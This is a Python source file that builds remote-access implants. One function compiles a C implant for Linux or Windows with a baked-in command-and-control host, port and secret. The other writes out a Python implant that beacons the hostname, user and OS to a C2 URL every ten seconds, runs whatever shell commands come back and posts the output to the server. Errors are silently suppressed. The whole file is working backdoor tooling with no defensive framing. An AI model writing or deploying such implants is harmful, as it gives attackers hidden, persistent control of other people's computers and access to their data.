import os, subprocess, textwrap, base64, tempfile

def build_c_implant(c2_host, c2_port, secret, out_path, target="linux"):
    src = textwrap.dedent(f'''
    #define C2_HOST "{c2_host}"
    #define C2_PORT {c2_port}
    #define SECRET "{secret}"
    ''').lstrip()
    with open("implant/implant.c") as f:
        body = f.read()
    tmp = tempfile.NamedTemporaryFile("w", suffix=".c", delete=False)
    tmp.write(src + body)
    tmp.close()
    cc = "x86_64-w64-mingw32-gcc" if target == "windows" else "gcc"
    out = out_path
    cmd = [cc, "-O2", "-o", out, tmp.name]
    if target == "windows":
        cmd += ["-lws2_32"]
    subprocess.check_call(cmd)
    os.unlink(tmp.name)
    return out

def build_python_implant(c2_url, secret, out_path):
    code = f'''
import os, socket, subprocess, time, json, base64, urllib.request
C2="{c2_url}"
SECRET="{secret}"
def beacon():
    while True:
        try:
            info = {{"host": socket.gethostname(), "user": os.getenv("USER") or os.getenv("USERNAME"), "os": os.name, "secret": SECRET}}
            req = urllib.request.Request(C2+"/beacon", data=json.dumps(info).encode(), headers={{"Content-Type":"application/json"}})
            r = urllib.request.urlopen(req, timeout=30).read().decode()
            if r and r != "null":
                cmd = json.loads(r).get("cmd")
                if cmd:
                    out = subprocess.getoutput(cmd)
                    req2 = urllib.request.Request(C2+"/output", data=json.dumps({{"secret":SECRET,"output":out}}).encode(), headers={{"Content-Type":"application/json"}})
                    urllib.request.urlopen(req2, timeout=10)
        except Exception:
            pass
        time.sleep(10)
beacon()
'''
    with open(out_path, "w") as f:
        f.write(code)
    return out_path
